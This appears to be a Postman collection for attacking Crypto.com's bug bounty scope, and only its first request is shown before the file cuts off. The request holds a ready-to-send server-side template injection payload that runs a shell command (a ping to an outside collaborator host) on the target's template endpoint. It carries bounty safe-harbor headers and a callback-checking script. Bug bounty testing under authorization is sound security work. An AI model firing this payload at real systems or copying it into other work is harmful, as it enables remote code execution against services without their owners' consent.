{
  "info": {
    "name": "Crypto.com Top 10 Critical Attacks",
    "schema": "https://schema.getpostman.com/json/collection/v2.1.0/collection.json",
    "description": "Top 10 highest-paying LLM, API, ASI, and AppSec attacks for Crypto.com bounty program. All requests include safe harbor headers."
  },
  "item": [
    {
      "name": "1️⃣ ASI05: RCE via Template Injection ($500k-$2M)",
      "event": [
        {
          "listen": "test",
          "script": {
            "exec": [
              "if (pm.response.code === 200) {",
              "    console.log('⚠️ Check response for template execution');",
              "    console.log('Collaborator domain: ' + pm.environment.get('collaborator'));",
              "    pm.environment.set('rce_tested', 'true');",
              "}"
            ],
            "type": "text/javascript"
          }
        }
      ],
      "request": {
        "method": "POST",
        "header": [
          {
            "key": "X-HackerOne-Research",
            "value": "{{hackerone_user}}",
            "description": "Required for safe harbor"
          },
          {
            "key": "X-Bug-Bounty-Testing",
            "value": "authorized",
            "description": "Required for safe harbor"
          },
          {
            "key": "X-Contact",
            "value": "{{contact_email}}",
            "description": "Contact information"
          },
          {
            "key": "Authorization",
            "value": "Bearer {{api_key}}",
            "description": "Your Crypto.com API key"
          },
          {
            "key": "Content-Type",
            "value": "application/json"
          },
          {
            "key": "User-Agent",
            "value": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36"
          }
        ],
        "body": {
          "mode": "raw",
          "raw": "{\n    \"template\": \"<%= system('ping -c 3 {{collaborator}}') %>\",\n    \"data\": {}\n}"
        },
        "url": {
          "raw": "{{developer_url}}/template/render",
          "host": ["{{developer_url}}"],
          "path": ["template", "render"]
        },
        "description": "Tests for Server-Side Template Injection (SSTI) leading to RCE. Check Burp Collaborator for callbacks."
      }
    },
